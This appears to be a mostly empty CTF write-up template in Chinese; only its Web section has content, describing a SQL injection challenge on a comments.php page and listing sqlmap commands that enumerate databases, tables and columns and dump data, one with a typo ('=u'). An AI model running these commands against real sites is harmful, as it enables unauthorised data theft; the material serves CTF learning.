## Web

### Word-For-You

无``WAF``的``SQL``注入:填完留言表后点查询留言，发现``url``的形式是: ``comments.php?name=admin``, 尝试用



总结一下``sqlmap``注入语句的流程：

```sql
sqlmap -u 'url' --dbs #列出数据库名
sqlmap -u 'url' -D dbname --tables #列出表名
sqlmap -u 'url' -D dbname -T tablename --columns #列出表名
sqlmap =u 'url' -D dbname -T tablename -C 'id,name' --dump #列出字段的数据
```



## Reverse



## Pwn



## Crypto



## Misc



## BlockChain

